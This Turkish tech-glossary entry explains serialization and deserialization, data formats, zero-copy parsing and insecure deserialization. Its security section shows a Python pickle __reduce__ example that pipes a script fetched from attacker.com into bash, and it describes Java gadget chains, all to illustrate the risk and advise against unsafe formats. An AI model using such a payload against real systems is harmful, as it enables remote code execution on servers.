# Serialization nedir, ne demek ve nasıl çalışır?

**Kategori:** Geliştirme  
**Son güncelleme:** 2026-09-19

Serialization (serileştirme), bir programlama dilinin çalışma belleğinde (RAM) dinamik olarak tahsis edilen nesneleri, veri yapılarını ve işaretçi (pointer) grafiklerini; ağ üzerinden iletilebilir veya diskte saklanabilir düz, doğrusal bir bayt akışına (byte stream) ya da metin formatına dönüştürme işlemidir.

Tersine işlem olan **deserialization (ters serileştirme)** ise bu bayt dizisini hedef sistemin belleğinde ayrıştırarak orijinal nesne hiyerarşisini, tiplerini ve değerlerini yeniden inşa eder.

## Serialization Ne Demek ve Neden Zorunludur? Bellek Modeli

Modern işletim sistemlerinde her süreç (process) kendine ait izole bir sanal bellek adres uzayında (virtual address space) çalışır. Çalışma zamanında bir nesne; yığın (stack) üzerinde yerel değişkenler, öbek (heap) üzerinde dinamik ayrılmış bellek blokları, fonksiyon işaretçileri (vtable) ve referans adresleri (`0x7ffee4b2...`) barındırır.

Bu bellek yapısı iki temel nedenden ötürü doğrudan başka bir ortama kopyalanamaz:

1. **Adres Uzayı İzolasyonu:** Bellek işaretçileri (pointers) sadece o anki çalışan sürecin sanal adres tablosunda anlamlıdır. Aynı sunucudaki başka bir sürece veya ağdaki bir istemciye bir bellek işaretçisi gönderdiğinizde, hedef sistemde geçersiz bellek erişimi (segmentation fault) veya bellek bozulması oluşur.
2. **Mimari ve Endianness Farklılıkları:** Farklı işlemci mimarileri (örneğin Little-Endian x86-64 ile Big-Endian ağ donanımları) çok baytlı tamsayıları ve kayan noktalı sayıları bellekte farklı bayt sıralamasıyla tutar. Ayrıca 32-bit ve 64-bit sistemlerde işaretçi genişlikleri ve veri hizalamaları (alignment/padding) farklıdır.

Serialization mekanizması; bellekteki nesne grafını (döngüsel referanslar dahil) derinlemesine veya genişlemesine dolaşır (graph traversal), yerel işaretçileri mantıksal ilişkilere dönüştürür ve veriyi platformdan bağımsız kanonik bir bayt dizilimine sokar.

## Serileştirme Formatları: Metin Tabanlı vs İkili (Binary)

Yazılım mimarisinde doğru serileştirme formatını seçmek; insan okunabilirliği, CPU ayrıştırma (parse) maliyeti, ağ bant genişliği ve tip güvenliği arasında bir denge kurmayı gerektirir.

### 1. Metin Tabanlı Formatlar (JSON, YAML, XML)
- **JSON (JavaScript Object Notation):** Modern webin ve RESTful API'lerin fiili standardıdır. Dilden bağımsızdır, tarayıcılarda yerel olarak desteklenir ve geliştiriciler tarafından kolayca okunup hata ayıklanabilir (debuggable).
- **Zayıf Yönleri:** Metin tabanlı ayrıştırma (lexing, tokenizing, string-to-number dönüşümleri) ciddi CPU tüketir. Her kayıtta anahtar isimlerinin (field keys) tekrarlanması gereksiz ağ yükü (payload overhead) yaratır. Ayrıca ikili veri (örneğin bir görsel veya şifrelenmiş anahtar) taşımak için Base64 kodlaması gerekir; bu da veri boyutunu yaklaşık %33 oranında şişirir.

### 2. İkili (Binary) ve Şemalı Formatlar (Protobuf, Avro, MessagePack)
- **Protocol Buffers (Protobuf):** Google tarafından geliştirilen, gRPC ve mikroservis iletişiminin omurgasını oluşturan ikili formattır. Katı bir şema dosyası (`.proto`) ile alan tiplerini ve alan numaralarını (field tags) tanımlar. Ağ üzerinden metin anahtarlar yerine sayısal etiketler ve değişken uzunluklu tamsayı kodlaması (Varint) gönderilir. JSON'a kıyasla 3 ila 10 kat daha az bant genişliği tüketir ve çok daha hızlı ayrıştırılır.
- **Apache Avro:** Büyük veri (Hadoop, Kafka) ekosisteminde yaygındır. Şema, her mesajın içine gömülmek yerine merkezi bir kayıt defterinde (Schema Registry) tutulur. Bu sayede mesaj başına düşen ek yük minimuma iner.
- **MessagePack ve BSON:** JSON'ın esnek, şemasız (schemaless) anahtar-değer modelini koruyarak veriyi ikili düzeyde sıkıştırılmış biçimde saklar.

| Format | Tip Sistemi | Şema Zorunluluğu | Okunabilirlik | Parse Maliyeti | Ana Kullanım Alanı |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **JSON** | Dinamik | İsteğe Bağlı (JSON Schema) | İnsan Okunabilir | Orta / Yüksek | Web API, Frontend |
| **Protobuf** | Katı Statik | Zorunlu (`.proto`) | İkili (Binary) | Düşük | Mikroservisler, gRPC |
| **FlatBuffers** | Katı Statik | Zorunlu (`.fbs`) | İkili (Binary) | Sıfır (Zero-Copy) | Oyunlar, HFT, Mobil |
| **Apache Avro** | Katı Statik | Zorunlu (`.avsc`) | İkili (Binary) | Düşük | Kafka, Büyük Veri |
| **MessagePack** | Dinamik | Yok | İkili (Binary) | Düşük / Orta | Redis önbellek, IPC |

## Zero-Copy Deserialization Mimarisi

Klasik serileştirme kütüphanelerinde (JSON ayrıştırıcıları veya standart Protobuf) deserialization süreci şu adımlarla yürütülür:

1. Ağ soketinden gelen bayt akışı geçici bir tampon belleğe (buffer) yazılır.
2. Ayrıştırıcı baytları tarayarak tipleri doğrular.
3. Belleğin öbek (heap) alanında her nesne, dize ve dizi için yeni bellek tahsis edilir (`malloc` veya dilin bellek yöneticisi).
4. Değerler tampon bellekten yeni oluşturulan heap nesnelerine kopyalanır.

Saniyede yüz binlerce isteğin işlendiği sistemlerde bu heap tahsisleri ve kopyalama işlemleri yüksek CPU tüketimine ve çöp toplayıcı (Garbage Collector) duraklamalarına yol açar.

**Zero-Copy (Sıfır Kopyalama) Yaklaşımı (FlatBuffers, Cap'n Proto):**
Bu kütüphanelerde veri serileştirilirken, bellekteki veri yapısı hizalamasına (memory alignment) ve göreceli kaydırma adreslerine (relative offsets) uygun şekilde ikili tampona yerleştirilir. 

Deserialization aşamasında hiçbir bellek tahsisi veya veri kopyalama gerçekleşmez. Uygulama, gelen bayt tamponunu doğrudan belleğe haritalar (mmap) ve nesne alanlarına doğrudan işaretçi aritmetiği ile erişir. Deserialization süresi fiilen 0 milisaniyedir. Bu mimari; yüksek frekanslı alım-satım (HFT), uç bilişim (Edge AI) ve AAA oyun motorlarında standarttır.

## Güvenlik Boyutu: Insecure Deserialization (CWE-502)

Serileştirme yalnızca saf veri taşımak yerine, nesne sınıflarını ve çalışma zamanı davranışlarını da serileştirmeye çalıştığında felaket boyutunda güvenlik açıkları doğar.

OWASP Top 10 listesinde yer alan **Insecure Deserialization (Güvensiz Ters Serileştirme)**, saldırganın sistemde keyfi kod çalıştırmasına (Remote Code Execution - RCE) imkan tanır.

### Python `pickle` Örneği
Python'ın dahili serileştirme modülü `pickle`, nesnelerin `__reduce__` metodunu serileştirir. Bu metot, nesne deserialization sırasında çağrılacak bir fonksiyon ve parametrelerini tanımlar. Saldırgan bu mekanizmayı kötüye kullanarak işletim sistemi komutu çalıştıran zararlı bir bayt dizisi üretebilir:

```python
# Saldırgan tarafından hazırlanan zararlı serileştirme paketi
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('curl -s https://attacker.com/steal.sh | bash',))
```

Bu bayt akışı sunucuya gönderilip `pickle.loads(payload)` çalıştırıldığı anda, sunucuda yetkisiz kabuk (shell) komutu yürütülür. Bu nedenle güvenilmeyen kaynaklardan gelen hiçbir veri `pickle` ile ayrıştırılmamalıdır.

### Java ve Nesne Zincirleri (Gadget Chains)
Java'nın yerel serileştirme mekanizmasında (`ObjectInputStream.readObject()`), sınıf yükleyici (classloader) gelen nesnenin sınıfını belleğe yükler. Saldırgan; sistemde yüklü kütüphanelerde (örneğin Apache Commons Collections veya Spring Framework) bulunan sınıfların metotlarını birbirine bağlayarak (gadget chain) bellek üzerinde komut çalıştıran bir yürütme zinciri inşa edebilir.

### Güvenli Serileştirme İlkeleri
- Asla çalıştırılabilir kod ya da sınıf tanımları içeren dille bütünleşik formatları (Python `pickle`, Java yerel serialization, PHP `unserialize`) ağ sınırlarında kullanmayın.
- Sadece saf veri taşıyan ve veri yapısını şemaya göre doğrulayan (strict schema validation) formatları tercih edin (JSON + Pydantic/Zod veya Protobuf).
- İkili veri alışverişlerinde kimlik doğrulama ve mesaj bütünlük kontrolü (HMAC veya TLS) uygulayın.

## Sıkça Sorulan Sorular

### Serialization ve Deserialization arasındaki temel fark nedir?
Serialization, bellekteki canlı nesneleri saklanabilir veya iletilebilir bir bayt/metin akışına dönüştürme sürecidir. Deserialization ise bu bayt dizisini okuyup ayrıştırarak hedef sistemin belleğinde yeniden çalışan bir nesneye dönüştürme işlemidir.

### Web projelerinde JSON yerine ne zaman Protobuf veya FlatBuffers kullanılmalıdır?
Genel internete açık web istemcileri ve halka açık API'ler için tarayıcı uyumluluğu ve hata ayıklama kolaylığı nedeniyle JSON idealdir. Ancak dahili mikroservisler, mobil uygulama arka uçları veya gerçek zamanlı veri akışlarında ağ bant genişliğini kısmak ve CPU ayrıştırma maliyetini düşürmek için Protobuf veya FlatBuffers tercih edilmelidir.

### Insecure Deserialization saldırısı nasıl çalışır ve nasıl engellenir?
Saldırgan, ters serileştirme sırasında çalıştırılacak zararlı fonksiyon veya sınıf yapılarını serileştirilmiş veri içine enjekte eder. Sunucu bu veriyi ayrıştırdığında sistem komutları tetiklenebilir. Engellemek için sınıf mantığı taşıyan formatlar terk edilmeli, sadece saf veri taşıyan şemalı formatlar (Protobuf, JSON Schema) kullanılmalıdır.

### Zero-copy deserialization ne anlama gelir?
Gelen bayt akışını yeni bellek alanları ayırıp kopyalamak yerine, veriyi doğrudan tampon bellek üzerindeki işaretçi ofsetleriyle okuma tekniğidir. Bellek tahsisini sıfırlayarak işlemciyi ve çöp toplayıcıyı rahatlatır.

### Şema evrimi (Schema Evolution) nedir; geriye ve ileriye uyumluluk nasıl sağlanır?
Yazılım güncellendikçe veri modelleri değişir. Protobuf ve Avro gibi sistemler, alanlara benzersiz sayısal kimlikler vererek eski istemcilerin yeni alanları yok saymasını (backward compatibility), yeni istemcilerin de eski verileri varsayılan değerlerle okuyabilmesini (forward compatibility) sağlar.

## İlgili terimler
- [API](/dictionary/api/)
- [Data Pipeline](/dictionary/data-pipeline/)
- [Memory Management](/dictionary/memory-management/)
- [Network Stack](/dictionary/network-stack/)

---
Kaynak: TreScout Teknoloji Sözlüğü · https://trescout.com/dictionary/serialization/  
TreScout her gün GitHub, Hacker News ve HuggingFace trendlerini Türkçe özetler.
